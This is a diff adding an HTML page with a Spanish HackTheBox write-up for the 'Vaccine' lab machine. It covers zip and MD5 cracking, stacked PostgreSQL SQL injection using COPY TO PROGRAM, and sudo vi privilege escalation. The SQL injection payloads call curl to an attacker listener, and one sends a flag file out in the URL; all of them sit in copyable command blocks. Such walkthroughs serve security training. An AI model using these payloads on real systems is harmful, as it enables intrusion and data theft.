@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Vaccine — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Vaccine de HackTheBox (Linux, Muy Fácil): FTP anónimo entrega un backup.zip crackeable, el código filtra un hash MD5, el panel tiene SQLi sobre PostgreSQL (COPY TO PROGRAM da RCE) y un sudo mal configurado sobre vi da root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/vaccine.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Vaccine — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Vaccine de HackTheBox (Linux, Muy Fácil): FTP anónimo entrega un backup.zip crackeable, el código filtra un hash MD5, el panel tiene SQLi sobre PostgreSQL (COPY TO PROGRAM da RCE) y un sudo mal configurado sobre vi da root.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/vaccine.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/vaccine.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Vaccine — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Vaccine de HackTheBox (Linux, Muy Fácil): FTP anónimo entrega un backup.zip crackeable, el código filtra un hash MD5, el panel tiene SQLi sobre PostgreSQL (COPY TO PROGRAM da RCE) y un sudo mal configurado sobre vi da root.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/vaccine.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Vaccine — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Vaccine de HackTheBox (Linux, Muy Fácil): FTP anónimo entrega un backup.zip crackeable, el código filtra un hash MD5, el panel tiene SQLi sobre PostgreSQL (COPY TO PROGRAM da RCE) y un sudo mal configurado sobre vi da root.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/vaccine.html", "image": "https://brandeiks.github.io/assets/og/vaccine.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/vaccine.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>vaccine</span>
+    </div>
+    <h1 class="writeup-title">VACC<span>INE</span></h1>
+    <p class="writeup-subtitle">// backup.zip crackeado → SQLi PostgreSQL (COPY TO PROGRAM) → sudo vi → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-ftp">FTP ANÓNIMO</span>
+      <span class="meta-badge badge-sqli">SQLI</span>
+      <span class="meta-badge badge-sudo">SUDO</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · FTP y backup</a></li>
+        <li><a href="#creds">02 · Crackeo y credenciales</a></li>
+        <li><a href="#sqli">03 · SQLi y RCE</a></li>
+        <li><a href="#escalada">04 · SSH y sudo vi</a></li>
+        <li><a href="#cmdref">05 · Referencia Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Vaccine</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">vsftpd + Apache + PostgreSQL</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">FTP anónimo → <span>backup.zip</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">john → zip + MD5 → <span>admin:qwerty789</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SQLi PostgreSQL → <span>COPY TO PROGRAM</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">dashboard.php → <span>postgres:P@s5w0rd!</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SSH + <span>sudo vi</span> → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 FTP Y BACKUP ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">FTP y backup</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">DESCARGAR EL BACKUP ANÓNIMO</span>
+      </div>
+      <div class="cmd-block" data-cmd="ftp -inv 10.129.95.174 &lt;&lt;'EOF'
+user anonymous anonymous
+ls -la
+get backup.zip
+bye
+EOF">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">FTP</span>
+        <div><span class="prompt">$ </span><span class="cmd">ftp <span class="flag">-inv</span> <span class="arg">10.129.95.174</span></span></div>
+        <div><span class="cmd">user anonymous anonymous</span></div>
+        <div><span class="cmd">get backup.zip</span></div>
+      </div>
+      <div class="output-block">
+        <div>226 Transfer complete.</div>
+        <div><span class="o-green">local: backup.zip remote: backup.zip — 2533 bytes</span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 02 CRACKEO Y CREDENCIALES ===================== -->
+    <div class="section" id="creds">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Crackeo y credenciales</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ROMPER LA CONTRASEÑA DEL ZIP</span>
+      </div>
+      <div class="cmd-block" data-cmd="zip2john backup.zip > ziphash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt; unzip -P 741852963 backup.zip -d backup_x">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">JOHN</span>
+        <div><span class="prompt">$ </span><span class="cmd">zip2john <span class="arg">backup.zip</span> &gt; <span class="arg">ziphash.txt</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--wordlist=</span><span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="arg">ziphash.txt</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">unzip <span class="flag">-P</span> <span class="arg">741852963</span> <span class="arg">backup.zip -d backup_x</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">741852963</span>         (backup.zip)</div>
+        <div>inflating: backup_x/index.php</div>
+        <div>inflating: backup_x/style.css</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ROMPER EL HASH DEL ADMINISTRADOR</span>
+      </div>
+      <div class="cmd-block" data-cmd="grep -iE 'md5|admin' backup_x/index.php; echo '2cb42f8734ea607eefed3b70af13bbd3' > md5.txt; john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">JOHN</span>
+        <div><span class="prompt">$ </span><span class="cmd">grep <span class="flag">-iE</span> <span class="arg">'md5|admin'</span> <span class="arg">backup_x/index.php</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--format=raw-md5 --wordlist=</span><span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="arg">md5.txt</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>if (md5($password) === "2cb42f8734ea607eefed3b70af13bbd3") { ... }</div>
+        <div><span class="o-green">qwerty789</span>         (md5.txt)</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// CREDENCIALES</p>
+        <p>
+          <strong>admin:qwerty789</strong> — el código fuente del backup entregó el hash MD5 exacto que compara el login;
+          con <code>rockyou.txt</code> se rompe en segundos.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 SQLI Y RCE ===================== -->
+    <div class="section" id="sqli">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">SQLi y RCE</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">LOGIN Y CONFIRMACIÓN DE LA INYECCIÓN</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s -c /tmp/vc_c.txt -b /tmp/vc_c.txt -L -d 'username=admin&password=qwerty789' http://10.129.95.174/index.php; sqlmap -u &quot;http://10.129.95.174/dashboard.php?search=Elixir&quot; --cookie=&quot;PHPSESSID=&lt;id&gt;&quot; --batch">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -c -b</span> <span class="arg">/tmp/vc_c.txt -L -d</span> <span class="arg">'username=admin&password=qwerty789'</span> <span class="arg">http://10.129.95.174/index.php</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-u</span> <span class="arg">"http://10.129.95.174/dashboard.php?search=Elixir"</span> <span class="flag">--cookie=</span><span class="arg">"PHPSESSID=&lt;id&gt;"</span> <span class="flag">--batch</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>Parameter: search (GET)</div>
+        <div><span class="o-green">Type: boolean-based blind / error-based</span></div>
+        <div>back-end DBMS: PostgreSQL</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// SQL INJECTION (POSTGRESQL)</p>
+        <p>
+          <strong>Dónde:</strong> <code>dashboard.php?search=</code>, que concatena directamente en
+          <code>SELECT * FROM cars WHERE name ILIKE '%&lt;search&gt;%'</code>.<br>
+          <strong>Qué permite:</strong> inyección apilada — no solo leer datos, sino ejecutar <strong>otras sentencias</strong> en
+          la misma conexión.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">RCE CON COPY TO PROGRAM</span>
+      </div>
+      <div class="cmd-block" data-cmd="PAYLOAD=&quot;Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/vc_beacon';-- -&quot;; curl -s -b &quot;PHPSESSID=&lt;id&gt;&quot; -G http://10.129.95.174/dashboard.php --data-urlencode &quot;search=$PAYLOAD&quot;">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">RCE</span>
+        <div><span class="prompt">$ </span><span class="cmd">PAYLOAD=<span class="arg">"Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/vc_beacon';-- -"</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -b</span> <span class="arg">"PHPSESSID=&lt;id&gt;"</span> <span class="flag">-G</span> <span class="arg">http://10.129.95.174/dashboard.php</span> --data-urlencode <span class="arg">"search=$PAYLOAD"</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[listener] GET /vc_beacon — beacon recibido</span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO</p>
+        <p>
+          <code>sqlmap --os-cmd</code> detecta la inyección pero <strong>no</strong> consiguió ejecutar comandos en este
+          objetivo. El payload apilado manual (<code>COPY (SELECT '') TO PROGRAM '…'</code>) sí funcionó a la primera —
+          <code>TO PROGRAM</code> solo lo acepta un usuario de PostgreSQL con privilegios de <strong>superusuario</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">EXFILTRAR LA FLAG Y EL CÓDIGO SIN SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          En vez de montar una reverse shell, cada comando manda su resultado por la propia URL de un segundo
+          <code>curl</code> hacia un listener HTTP propio — útil porque <code>TO PROGRAM</code> no devuelve salida directamente.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="search=Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/flag/$(cat /var/lib/postgresql/user.txt)';-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">EXFIL</span>
+        <div><span class="cmd">search=Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/flag/$(cat /var/lib/postgresql/user.txt)';-- -</span></div>
+      </div>
+      <div class="output-block">
+        <div>[listener] GET /flag/<span class="o-green">[flag oculta]</span></div>
+        <div><span class="comment"># mismo truco con dashboard.php en base64 url-safe revela: postgres:P@s5w0rd!</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAG DE USUARIO Y CREDENCIAL SSH</p>
+        <p>
+          <strong>[flag oculta]</strong> — y, en el código de <code>dashboard.php</code> exfiltrado de la
+          misma forma, la cadena de conexión revela <code>postgres:P@s5w0rd!</code>.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 SSH Y SUDO VI ===================== -->
+    <div class="section" id="escalada">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">SSH y sudo vi</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">ENTRAR POR SSH Y REVISAR SUDO</span>
+      </div>
+      <div class="cmd-block" data-cmd="sshpass -p 'P@s5w0rd!' ssh postgres@10.129.95.174; echo 'P@s5w0rd!' | sudo -S -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">sshpass <span class="flag">-p</span> <span class="arg">'P@s5w0rd!'</span> ssh <span class="arg">postgres@10.129.95.174</span></span></div>
+        <div><span class="prompt">postgres@vaccine:~$ </span><span class="cmd">echo 'P@s5w0rd!' | sudo <span class="flag">-S -l</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>User postgres may run the following commands:</div>
+        <div><span class="o-yellow">    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// SUDO SOBRE UN EDITOR = ROOT</p>
+        <p>
+          <strong>Dónde:</strong> <code>sudo</code> permite ejecutar <code>vi</code> como root sobre un fichero concreto.<br>
+          <strong>Qué permite:</strong> <code>vi</code> tiene un modo de comandos (<code>:!comando</code>) que ejecuta
+          cualquier instrucción del sistema con los mismos privilegios del editor — en este caso, root.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ESCALAR Y LEER ROOT.TXT</span>
+      </div>
+      <div class="cmd-block" data-cmd="(sleep 1; echo 'P@s5w0rd!'; sleep 2; echo ':!install -m 644 /root/root.txt /tmp/root2.txt'; sleep 1; echo ''; sleep 1; echo ':q!'; sleep 1; echo '') | script -qec &quot;sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf&quot; /dev/null >/dev/null 2>&1; cat /tmp/root2.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SUDO VI</span>
+        <div><span class="comment"># script da un pseudo-TTY; dentro de vi, :!install copia la flag con permisos legibles</span></div>
+        <div><span class="prompt">postgres@vaccine:~$ </span><span class="cmd">cat /tmp/root2.txt</span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS</p>
+        <p>
+          <strong>user:</strong> [flag oculta] · <strong>root:</strong> [flag oculta].
+          Ruta completa: FTP anónimo → <code>backup.zip</code> (john) → MD5 del admin → login → SQLi PostgreSQL
+          (<code>COPY TO PROGRAM</code>) → postgres → SSH → <code>sudo vi</code> → root. Tiempo total: ~30 minutos.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 05 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">zip2john / john</div>
+          <div class="cmd-ref-syntax">zip2john archivo.zip > hash.txt ; john --wordlist=lista hash.txt</div>
+          <div class="cmd-ref-desc">Extrae el hash de un zip protegido y lo rompe por diccionario.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">john --format=raw-md5</div>
+          <div class="cmd-ref-syntax">john --format=raw-md5 --wordlist=lista hash.txt</div>
+          <div class="cmd-ref-desc">Rompe un hash MD5 suelto (sin formato de archivo), como los que se encuentran en código fuente filtrado.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sqlmap</div>
+          <div class="cmd-ref-syntax">sqlmap -u "URL?param=valor" --cookie="..." --batch</div>
+          <div class="cmd-ref-desc">Detecta y confirma inyecciones SQL automáticamente; útil para identificar el motor y el tipo de inyección antes de explotar a mano.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">COPY ... TO PROGRAM</div>
+          <div class="cmd-ref-syntax">COPY (SELECT '') TO PROGRAM 'comando';-- -</div>
+          <div class="cmd-ref-desc">Extensión de PostgreSQL (solo superusuario) que ejecuta un comando del sistema operativo desde una consulta apilada.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sudo -S -l</div>
+          <div class="cmd-ref-syntax">echo contraseña | sudo -S -l</div>
+          <div class="cmd-ref-desc">Lista las reglas de sudo del usuario leyendo la contraseña por stdin, útil sin terminal interactivo.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 06 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SQL injection apilada (stacked queries)</div>
+          <div class="glos-def">
+            Variante de SQLi donde se inyecta una sentencia completa adicional (separada por <code>;</code>), no solo
+            condiciones dentro de un <code>WHERE</code>. Permite ejecutar <code>INSERT</code>, <code>COPY</code> u otras
+            instrucciones distintas a la original.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">COPY TO PROGRAM</div>
+          <div class="glos-def">
+            Función de PostgreSQL pensada para exportar datos a través de un programa externo. Si el atacante controla el
+            comando y el usuario de BD es superusuario, equivale a ejecución de comandos del sistema.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Exfiltración fuera de banda (out-of-band)</div>
+          <div class="glos-def">
+            Técnica para sacar datos cuando la inyección no devuelve resultados directamente: el propio objetivo hace una
+            petición HTTP (con los datos en la URL) a un servidor controlado por el atacante.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">sudo mal configurado</div>
+          <div class="glos-def">
+            Regla de <code>sudo</code> que permite ejecutar un programa con capacidades propias de shell (editores,
+            paginadores, intérpretes) como root. GTFOBins documenta decenas de binarios así.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">vi — modo comando (:!)</div>
+          <div class="glos-def">
+            Dentro de <code>vi</code>/<code>vim</code>, <code>:!comando</code> ejecuta un comando de shell con los
+            privilegios del propio editor, sin salir de él.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="oopsie.html"><span class="dir">← ANTERIOR</span><span class="nombre">Oopsie</span></a><a class="siguiente" href="markup.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Markup</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="oopsie.html"><span class="nombre">Oopsie</span><span class="meta">hackthebox · muy-facil · SUID · PrivEsc</span></a><a class="rel-card" href="../facil/goodgames.html"><span class="nombre">GoodGames</span><span class="meta">hackthebox · facil · SQLi · SSTI</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Vaccine · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "VACCINE", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/vaccine.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
